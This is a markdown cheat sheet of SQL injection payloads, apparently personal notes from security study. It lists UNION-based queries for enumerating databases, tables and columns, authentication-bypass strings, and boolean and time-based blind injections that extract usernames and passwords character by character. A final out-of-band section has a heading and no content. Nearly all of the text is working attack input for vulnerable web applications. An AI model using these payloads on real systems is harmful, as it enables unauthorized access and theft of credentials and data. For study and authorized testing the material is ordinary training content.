# SQLi

## Mapping in-band sqli

e.g. id=1 -> id=1' id=1" gets SQL error

```
1 UNION SELECT 1

1 UNION SELECT 1,2

1 UNION SELECT 1,2,3
```

repeat process until there is no longer an error

Retrieve database name

```
0 UNION SELECT 1,2,database()
```

Get tables

```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = <db_name>
```

Get table structure

```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = <table_name>
```


```
0 UNION SELECT 1,2,group_concat(col1,':',col2 SEPARATOR '<br>') FROM table_name
```

## Authentication Bypass

' OR 1=1;--
' or 1=1 -- -

### When application anticipates only 1 row to be returned
' or 1=1 LIMIT 1; --

## Mapping Boolean Blind SQLi

In the context of checking if a username is taken in a signup form

e.g. admin123 user is not taken (false) we try to find true values

```
admin123' UNION SELECT 1;-- (false)

admin123' UNION SELECT 1,2,3;-- (true)

admin123' UNION SELECT 1,2,3 where database() like '%';-- (true)
```

# Iterate through characters to find database name

admin123' UNION SELECT 1,2,3 where database() like 'a%';-- (false)

admin123' UNION SELECT 1,2,3 where database() like 'b%';-- (true)

admin123' UNION SELECT 1,2,3 where database() like 'ba%';-- (true) 

# Iterate through to find table names

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'bad' and table_name like 'a%';--

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'bad' and table_name='users';--

# Then columns

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='bad' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='bad' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

# enumerate usernames

admin123' UNION SELECT 1,2,3 from users where username like 'a%

# then passwords
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%

Mapping time-based blind sqli
----------------------------
Same as above but true|false is reflected in response times by successfully executing added sleep() function

admin123' UNION SELECT SLEEP(5);--

admin123' UNION SELECT SLEEP(5),2;--

referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

Out-of-band SQLi
----------------


















 




